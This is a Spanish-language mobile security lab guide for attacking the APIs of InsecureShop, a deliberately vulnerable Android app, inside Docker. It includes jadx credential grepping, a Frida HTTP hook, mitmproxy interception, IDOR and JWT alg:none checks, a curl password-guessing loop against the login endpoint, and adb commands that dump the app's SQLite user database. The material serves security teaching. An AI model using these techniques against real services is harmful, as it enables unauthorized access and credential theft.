# Lab 05 — API Testing Mobile con Docker

## Objetivo

Identificar, interceptar y atacar las APIs backend que consumen las apps Android vulnerables, usando las herramientas del entorno Docker.

---

## Entorno

```
InsecureShop (app) → [proxy 10.0.2.2:8080] → Burp / mitmproxy
                                                    │
                                            Análisis de endpoints
                                            Tests de autenticación
                                            Fuzzing de parámetros
```

```bash
cd containers/mobile
docker compose up -d android mobile-tools
```

---

## Parte 1 — Descubrimiento de Endpoints

### Con jadx (análisis estático)

```bash
docker exec -it mobile-tools bash

# Decompilar InsecureShop
jadx -d /workspace/shop-decomp /apks/InsecureShop/InsecureShop.apk

# Buscar URLs y endpoints
grep -rEo '"https?://[^"]*"' /workspace/shop-decomp/ | sort -u

# Buscar clientes HTTP
grep -rn "OkHttpClient\|Retrofit\|HttpURLConnection\|Volley" \
     /workspace/shop-decomp/ --include="*.java"

# Buscar rutas de la API
grep -rEo '"(/api|/v[0-9]+)[^"]*"' /workspace/shop-decomp/ | sort -u

# Buscar credenciales hardcodeadas
grep -rn "username\|password\|apikey\|Bearer\|Basic " \
     /workspace/shop-decomp/ --include="*.java" -i | grep -v "//.*import"
```

### Con Frida (análisis dinámico)

```javascript
// Interceptar llamadas HTTP (OkHttp hook)
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    var Chain = Java.use("okhttp3.Interceptor$Chain");

    // Hook a Call.execute para capturar requests
    var RealCall = Java.use("okhttp3.internal.connection.RealCall");
    RealCall.execute.implementation = function() {
        var request = this.request();
        console.log("\n[HTTP] " + request.method() + " " + request.url());

        var headers = request.headers();
        for (var i = 0; i < headers.size(); i++) {
            console.log("  " + headers.name(i) + ": " + headers.value(i));
        }

        return this.execute();
    };
});
```

```bash
docker exec -it mobile-tools bash
frida -H mobile-android:5555 -f com.shop.insecureshop \
      --no-pause -l /workspace/hook-http.js
```

---

## Parte 2 — Autenticación y Autorización

### Identificar el mecanismo de auth

```bash
# Interceptar con mitmproxy y filtrar headers de auth
docker exec -it mobile-tools bash
mitmweb --listen-host 0.0.0.0 --listen-port 8080 \
        --web-host 0.0.0.0 --web-port 8081

# Acceder a la UI de mitmproxy: http://localhost:8081
```

### Tests comunes en el proxy (Burp Repeater)

```bash
# 1. Login con credenciales por defecto de InsecureShop
POST /api/auth/login
{"username": "admin@admin.com", "password": "admin@admin.com"}

# 2. Probar IDOR — acceder a recursos de otro usuario
GET /api/orders/1  (con sesión del usuario 2)
GET /api/user/profile/1

# 3. Probar tokens JWT (si aplica)
# Decodificar header.payload.signature en jwt.io
# Intentar alg:none
# Intentar cambiar rol en el payload

# 4. Probar sin token
GET /api/products  (sin header Authorization)
```

---

## Parte 3 — Fuzzing con httpx y curl

```bash
docker exec -it mobile-tools bash

# Extraer la IP del container de Android
ANDROID_IP=$(getent hosts mobile-android | awk '{ print $1 }')

# O usar la IP que expone la API backend (si la hay)
# Para InsecureShop, la API backend corre local en la app
# Interceptar primero para obtener el host real

# Fuzzear endpoint de login con curl
for pass in "admin" "password" "123456" "admin123" "guest"; do
    echo "Testing password: $pass"
    curl -s -X POST "http://<API_HOST>/api/auth/login" \
         -H "Content-Type: application/json" \
         -d "{\"username\":\"admin@admin.com\",\"password\":\"$pass\"}" \
         | python3 -m json.tool
done
```

---

## Parte 4 — Vulnerabilidades Comunes de APIs Móviles

### OWASP Mobile Top 10 — APIs

| # | Vulnerabilidad | Qué buscar |
|---|----------------|-----------|
| M1 | Improper Credential Usage | Credenciales hardcodeadas, tokens en código |
| M2 | Inadequate Supply Chain Security | Dependencias sin firmar |
| M3 | Insecure Authentication | Bypass de login, tokens débiles |
| M4 | Insufficient Input/Output Validation | SQLi, XSS en WebViews |
| M5 | Insecure Communication | HTTP plano, TLS 1.0 |
| M6 | Inadequate Privacy Controls | PII en logs, almacenamiento inseguro |
| M8 | Security Misconfiguration | Debug habilitado, backups |

### Checklist para InsecureShop

```bash
# 1. ¿La API devuelve información sensible sin autenticar?
curl http://<API>/api/products

# 2. ¿Los errores revelan información interna?
curl http://<API>/api/nonexistent

# 3. ¿Hay IDOR en el perfil de usuario?
# Cambiar el ID del usuario en la ruta

# 4. ¿Los tokens expiran correctamente?
# Usar un token viejo después del logout

# 5. ¿Hay endpoints de administración expuestos?
curl http://<API>/api/admin
curl http://<API>/api/users
```

---

## Parte 5 — Análisis de Tráfico en Reposo

```bash
docker exec -it mobile-tools bash

# Ver base de datos SQLite de la app (si tiene acceso root ADB)
adb -s mobile-android:5555 root
adb -s mobile-android:5555 shell

# Dentro del shell
ls /data/data/com.shop.insecureshop/databases/
sqlite3 /data/data/com.shop.insecureshop/databases/insecureshop.db
.tables
SELECT * FROM users;
.quit

# Extraer la DB al host para análisis
adb -s mobile-android:5555 pull \
    /data/data/com.shop.insecureshop/databases/insecureshop.db \
    /workspace/insecureshop.db
```

---

## Actividades

1. Mapear todos los endpoints de la API de InsecureShop usando jadx y el proxy
2. Identificar si existe IDOR en los endpoints de órdenes o perfil
3. Verificar si la API acepta peticiones sin token de autenticación
4. Extraer y analizar la base de datos SQLite de la app
5. Documentar al menos 3 vulnerabilidades de API encontradas con evidencia

---

## Referencias

- [OWASP Mobile Top 10 (2024)](https://owasp.org/www-project-mobile-top-10/)
- [InsecureShop Write-up](https://github.com/optiv/InsecureShop)
- [OWASP MASTG — Testing Data Storage](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0008/)
- [mitmproxy Docs](https://docs.mitmproxy.org/)
